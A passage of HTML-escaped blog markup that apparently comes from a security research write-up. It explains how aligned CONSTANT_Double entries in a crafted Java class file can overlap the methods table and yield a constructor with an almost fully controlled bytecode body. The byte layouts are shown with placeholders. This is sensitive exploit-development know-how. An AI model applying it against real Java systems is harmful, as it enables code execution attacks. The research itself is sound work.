10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Code_attribute&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 attribute_name_index&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 attribute_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 max_stack&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 max_locals&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 code_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 code&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;code_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 exception_table_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &amp;nbsp; u2 start_pc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 end_pc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 handler_pc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 catch_type&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; exception_table&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;exception_table_length&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;attribute_info attributes&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attributes_count&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The methods table is a dynamically sized array of &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;method_info&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; structs. Each of these structs describes the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; of the method, an index into the constant table that points to its name (as a utf8 constant), and another index pointing to the method descriptor (another CONSTANT_Utf8).&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This is followed by the attributes table, a dynamically sized map from Utf8 keys stored in the constant table to dynamically sized values stored inline. Fortunately, the only attribute we need to provide is the Code attribute, which contains the actual bytecode of the method.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Going back to our payload, we can see that the start of the methods table is aligned with the tag byte of the next entry in the constant pool table. This means that the 0x06 tag of a CONSTANT_Double will clobber the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flag&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; field of the first method, making it unusable for us. Instead we have to create two methods: The first one as a basic filler to get the alignment right, and the second one as the actual constructor. Fortunately, the JVM ignores unknown attributes, so we can use dynamically sized attribute values. The graphic below shows how we use a series of CONST_DOUBLE entries to create a constructor method with an almost fully controlled body.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 0x01&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; 0xXX&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xXX&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; 0xYY 0xYY&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x01&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x00 0x00 0x05&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x00 0x00 0x00&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"background-color: #fce5cd; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x01 &lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xCC 0xCC&lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xDD 0xDD&lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #cfe2f3; color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x03&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0f9d58; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x04&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x00 0x00 0x00&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xCC&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xDD&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0xZZ&lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; 